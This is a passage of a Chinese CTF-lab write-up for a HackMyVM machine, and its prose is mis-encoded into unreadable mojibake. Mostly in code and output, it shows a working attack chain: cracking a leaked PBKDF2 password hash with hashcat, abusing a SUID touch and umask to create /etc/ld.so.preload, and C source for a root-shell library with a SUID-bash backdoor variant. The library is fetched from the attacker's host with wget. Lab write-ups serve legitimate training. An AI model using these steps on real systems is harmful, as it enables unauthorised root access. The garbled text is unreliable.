<p>è¿™æ ·å°±ç”Ÿæˆäº†ä¸€ä¸ªfilteré“¾ï¼Œè¿™é‡Œé‡Œé¢å°±æ˜¯ç”¨æ²¡æœ‰è¢«bançš„shell_execå‡½æ•°ï¼Œç„¶åæˆ‘ä»¬ç”¨getè¯·æ±‚å°±èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤äº†<br>ä½†æ˜¯æˆ‘è¿™é‡Œä¸‹è½½çš„æ˜¯å®Œæ•´ç‰ˆçš„ï¼Œè¿™ä¸ªæ–¹æ³•å°±è¢«banäº†ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼Œåå¼¹shellå¾—åˆ°çš„shellçš„ps1ä¸å¯¹ï¼Œè¦ç”¨bash-p</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>é€šè¿‡åˆšæ‰çš„ä¸¤ç§æ–¹æ³•ï¼Œæœ€åéƒ½æ˜¯ä¸ºäº†å¾—åˆ°<code>.2024_12_25_project_web_login_password.bak</code>é‡Œçš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pbkdf2</span>:sha256:<span class="number">50000</span>:flower:<span class="number">0916690</span>d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªç”¨pbkdf2 sha256åŠ å¯†çš„å¯†ç <br>æœç´¢ä¹‹åæ‰¾åˆ°äº†ç”¨hashcatç ´è§£è¿™ä¸ªå¯†ç çš„æ–¹æ³•<a href="https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256">0xBEN|Notes</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">â””â”€#</span> <span class="string">hashcat</span> <span class="string">--hash-info</span> <span class="string">-m</span> <span class="number">10900</span></span><br><span class="line"><span class="string">hashcat</span> <span class="string">(v6.2.6)</span> <span class="string">starting</span> <span class="string">in</span> <span class="string">hash-info</span> <span class="string">mode</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Hash Info:</span></span><br><span class="line"><span class="string">==========</span></span><br><span class="line"></span><br><span class="line"><span class="string">Hash</span> <span class="string">mode</span> <span class="comment">#10900</span></span><br><span class="line">  <span class="attr">Name................:</span> <span class="string">PBKDF2-HMAC-SHA256</span></span><br><span class="line">  <span class="attr">Category............:</span> <span class="string">Generic</span> <span class="string">KDF</span></span><br><span class="line">  <span class="attr">Slow.Hash...........:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Password.Len.Min....:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">Password.Len.Max....:</span> <span class="number">256</span></span><br><span class="line">  <span class="attr">Salt.Type...........:</span> <span class="string">Embedded</span></span><br><span class="line">  <span class="attr">Salt.Len.Min........:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">Salt.Len.Max........:</span> <span class="number">256</span></span><br><span class="line">  <span class="attr">Kernel.Type(s)......:</span> <span class="string">pure</span></span><br><span class="line">  <span class="attr">Example.Hash.Format.:</span> <span class="string">plain</span></span><br><span class="line">  <span class="attr">Example.Hash........:</span> <span class="string">sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk</span></span><br><span class="line">  <span class="attr">Example.Pass........:</span> <span class="string">hashcat</span></span><br><span class="line">  <span class="attr">Benchmark.Mask......:</span> <span class="string">?b?b?b?b?b?b?b</span></span><br><span class="line">  <span class="attr">Autodetect.Enabled..:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Self.Test.Enabled...:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Potfile.Enabled.....:</span> <span class="literal">Yes</span></span><br><span class="line">  <span class="attr">Custom.Plugin.......:</span> <span class="literal">No</span></span><br><span class="line">  <span class="attr">Plaintext.Encoding..:</span> <span class="string">ASCII,</span> <span class="string">HEX</span></span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡è¿™ä¸ªç¤ºä¾‹å¯ä»¥å¾—å‡ºæ­£ç¡®çš„hashæ ¼å¼æ˜¯ <code>algorithm:iterations:salt:hash</code></p>
<p><code>0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028</code>è¿™æ˜¯ä¸€ä¸ª16è¿›åˆ¶ç¼–ç ï¼Œæˆ‘ä»¬è¦å…ˆç”¨xxdè¿˜åŸç„¶åç”¨base64åŠ å¯†<br>flowerä¹Ÿè¦base64çš„æ ¼å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> -n <span class="string">&quot;0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028&quot;</span> | xxd -p -r | <span class="built_in">base64</span></span><br><span class="line">CRZpDXvC+SoOHxZAzn7iLpiIQzI++4yOQwZOr+2SsCg=</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> flower | <span class="built_in">base64</span>                                                                           </span><br><span class="line">Zmxvd2VyCg==</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥æœ€åå¯ä»¥ç ´è§£çš„hashä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sha256:</span><span class="number">50000</span><span class="symbol">:Zmxvd2VyCg</span><span class="symbol">:CRZpDXvC+SoOHxZAzn7iLpiIQzI++</span><span class="number">4</span>yOQwZOr+<span class="number">2</span>SsCg=</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hashcat -a 0 -m 10900 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt -d 1 -w 3</span><br></pre></td></tr></table></figure></div>
<p>hashcat -mæŒ‡å®šç±»å‹ -a 0 è¡¨ç¤ºç”¨å­—å…¸æ”»å‡»<br>å¾—åˆ°ä¸€ä¸ªå¯†ç <code>roseflower</code>,åˆšæ‰ç”¨èšå‰‘çœ‹åˆ°å®¶ç›®å½•ä¸‹é¢åªæœ‰ä¸€ä¸ªwelcomeç”¨æˆ·ï¼Œè¿™ä¸ªå°±æ˜¯welcomeçš„å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>bash -p</span><br><span class="line">welcome<span class="variable">@listen</span>:~<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">welcome:</span> </span><br><span class="line">Sorry, user welcome may not run sudo on listen.</span><br><span class="line">welcome<span class="variable">@listen</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/touch</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„touchæœ‰suidï¼Œæˆ‘ä»¬å°±æ˜¯è¦ç”¨è¿™ä¸ªtouchææƒ<br>touchæ˜¯ä¸€ä¸ªåˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ï¼Œè¿™é‡Œæœ‰suidå°±æ˜¯å¯ä»¥åˆ›å»ºä¸€ä¸ªrootçš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">welcome@listen:~$ touch a</span><br><span class="line">welcome@listen:~$ ls</span><br><span class="line">a  user.txt</span><br><span class="line">welcome@listen:~$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwx------<span class="number"> 2 </span>welcome welcome<span class="number"> 4096 </span>Feb<span class="number"> 22 </span>03:47 .</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root     <span class="number"> 11 </span>Feb <span class="number"> 1 </span>11:10 .-</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Jan <span class="number"> 7 </span>23:16 ..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root      <span class="number"> 0 </span>Feb<span class="number"> 22 </span>03:47 a</span><br><span class="line">-rw-------<span class="number"> 1 </span>welcome welcome  <span class="number"> 69 </span>Feb <span class="number"> 1 </span>07:13 .bash_history</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root    root     <span class="number"> 33 </span>Jan <span class="number"> 7 </span>23:18 user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åè¿˜æœ‰äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹<code>umask</code>ï¼Œä¸ºä»€ä¹ˆä¼šæƒ³åˆ°è¿™ä¸ªå‘¢ï¼Ÿå› ä¸ºç°åœ¨æœ‰åŠæ³•åˆ›é€ rootçš„æ–‡ä»¶ï¼Œè€Œä¸”æ˜¯ä»¥å½“å‰ç”¨æˆ·çš„shellé‡Œé¢çš„ï¼Œ<br>æˆ‘ä»¬å¯ä»¥æ§åˆ¶umaskä»è€Œä¿®æ”¹æ–‡ä»¶çš„æƒé™<br>umaskçš„æƒé™ä¿®æ”¹æ–¹å¼å’Œchmodæ˜¯ç›¸åçš„ï¼Œchmodæ˜¯ç›´æ¥ç»™æƒé™ï¼Œumaskæ˜¯ç”¨666å‡å»æƒé™ï¼Œæ¯”å¦‚umaskæ˜¯022 é‚£åˆ›å»ºä¹‹åçš„æƒé™å°±æ˜¯644<br>ç°åœ¨æŠŠumaskæ”¹æˆ0000 å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªrootçš„å¹¶ä¸”æƒé™æ˜¯666çš„æ–‡ä»¶ã€‚<br>ç°åœ¨æˆ‘ä»¬åœ¨æœ¬æœºè¿½è¸ªä¸€ä¸‹touchã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# strace touch <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -<span class="built_in">Pi</span> <span class="string">&quot;open|access|no such file&quot;</span></span><br><span class="line">faccessat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/aarch64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/lib/locale/locale-archive&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/locale.alias&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US.UTF-8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US.utf8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en.UTF-8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en.utf8/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&quot;</span>, O_RDONLY) = <span class="number">-1</span> ENOENT (<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory)</span><br><span class="line">                                                                                                                  </span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯åœ¨é¶æœºæ²¡æœ‰å‘ç°<code>/etc/ld.so.preload</code>è¿™ä¸ªæ–‡ä»¶ï¼Œåˆ©ç”¨ç‚¹å°±æ˜¯è¿™é‡Œäº†<br>è¯¥æ–‡ä»¶æ˜¯ Linux ç³»ç»Ÿçš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®šç¨‹åºå¯åŠ¨æ—¶<strong>å¼ºåˆ¶ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.so æ–‡ä»¶ï¼‰</strong>ã€‚ä¸Â <code>LD_PRELOAD</code>Â ç¯å¢ƒå˜é‡ä¸åŒï¼Œ<code>/etc/ld.so.preload</code>Â çš„å½±å“æ˜¯<strong>ç³»ç»Ÿçº§çš„</strong>ï¼Œä¼šå¯¹æ‰€æœ‰ç”¨æˆ·å’Œè¿›ç¨‹ç”Ÿæ•ˆ<br>è¯¥æ–‡ä»¶çš„è¡Œä¸ºç±»ä¼¼äº**<code>LD_PRELOAD</code>**Â ENV å˜é‡ï¼Œä½†ä¹Ÿé€‚ç”¨äºÂ <strong>SUID äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚<br>å¦‚æœæ‚¨å¯ä»¥åˆ›å»ºå®ƒæˆ–ä¿®æ”¹å®ƒï¼Œåˆ™åªéœ€åœ¨æ¯ä¸ªæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­<strong>åŠ è½½çš„åº“ä¸­æ·»åŠ è·¯å¾„</strong>å³å¯ã€‚<br>æ‰€ä»¥ç°åœ¨å¯ä»¥ç”¨touchåˆ›å»ºä¸€ä¸ªld.so.preloadæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªåˆ©ç”¨ä»£ç ï¼Œç¼–è¯‘å¥½ä¹‹åæŠŠæ–‡ä»¶åœ°å€è¿›å…¥ld.so.preload<br><img src="https://pic1.imgdb.cn/item/67b99244d0e0a243d401f25c.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="comment">//åé—¨å†™æ³•-åªç”¨ä¸€æ¬¡ system(&quot;cp /bin/bash /tmp/sh ; chmod +s /tmp/sh; rm /etc/ld.so.preload&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cd /tmp</span></span><br><span class="line"><span class="comment">//gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># x86_64-linux-gnu-gcc -fPIC -shared -o a.so a.c -nostartfiles</span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.server 80                                                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port<span class="number"> 80 </span>(http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ wget 192.168.112.11/a.so</span><br><span class="line">--2025-02-22 04:10:46--  http://192.168.112.11/a.so</span><br><span class="line">Connecting to 192.168.112.11:80... connected.</span><br><span class="line">HTTP request sent, awaiting response...<span class="number"> 200 </span>OK</span><br><span class="line">Length:<span class="number"> 14144 </span>(14K) [application/octet-stream]</span><br><span class="line">Saving to: â€˜a.soâ€™</span><br><span class="line"></span><br><span class="line">a.so                                   100%[=========================================================================&gt;]  13.81K  --.-KB/s    in 0.001s  </span><br><span class="line"></span><br><span class="line">2025-02-22 04:10:47 (24.9 MB/s) - â€˜a.soâ€™ saved [14144/14144]</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ ls -al</span><br><span class="line">total 48</span><br><span class="line">drwxrwxrwt <span class="number"> 8 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>04:10 .</span><br><span class="line">drwxr-xr-x<span class="number"> 18 </span>root    root    <span class="number"> 4096 </span>Jan <span class="number"> 7 </span>21:50 ..</span><br><span class="line">-rw-rw-rw- <span class="number"> 1 </span>root    root       <span class="number"> 0 </span>Feb<span class="number"> 22 </span>04:06 a</span><br><span class="line">-rw-rw-rw- <span class="number"> 1 </span>welcome welcome<span class="number"> 14144 </span>Feb<span class="number"> 22 </span>04:03 a.so</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .font-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .ICE-unix</span><br><span class="line">drwx------ <span class="number"> 3 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:34 systemd-private-ea7792e20f1b4a46a4474e8000aad4ea-systemd-timesyncd.service-uxH5C3</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .Test-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .X11-unix</span><br><span class="line">drwxrwxrwt <span class="number"> 2 </span>root    root    <span class="number"> 4096 </span>Feb<span class="number"> 22 </span>02:33 .XIM-unix</span><br><span class="line">welcome@listen:/tmp$ echo /tmp/a.so &gt; /etc/ld.so.preload</span><br><span class="line">welcome@listen:/tmp$ touch aa</span><br><span class="line">root@listen:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(welcome)</span><br></pre></td></tr></table></figure></div>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦åˆ°ç”¨ä¼ªåè®®è¯»æ–‡ä»¶ï¼Œå’Œdataä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œç„¶åå­¦åˆ°äº†èšå‰‘çš„è¿™ç§dataä¼ªåè®®è¯»å–æ–‡ä»¶çš„ä½¿ç”¨æ–¹å¼<br>äº†è§£äº†filterchainè¿™ä¸ªå·¥å…·ï¼Œå­¦åˆ°äº†hashcatçš„ä½¿ç”¨æ–¹å¼<br>umaskï¼Œstraceå‘½ä»¤å­¦ä¹  umaskåœ¨å¯ä»¥åˆ›å»ºæ–‡ä»¶çš„æ—¶å€™æœ‰ç”¨<br>&#x2F;etc&#x2F;ld.so.preloadæ–‡ä»¶å­¦ä¹ ï¼Œä¹‹å‰äº†è§£è¿‡LD_PRELOADå’Œè¿™ä¸ªä¹Ÿæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œç„¶åäº†è§£äº†è¿™ç§ææƒçš„æ–¹å¼å’Œcè¯­è¨€ä»£ç </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
</search>
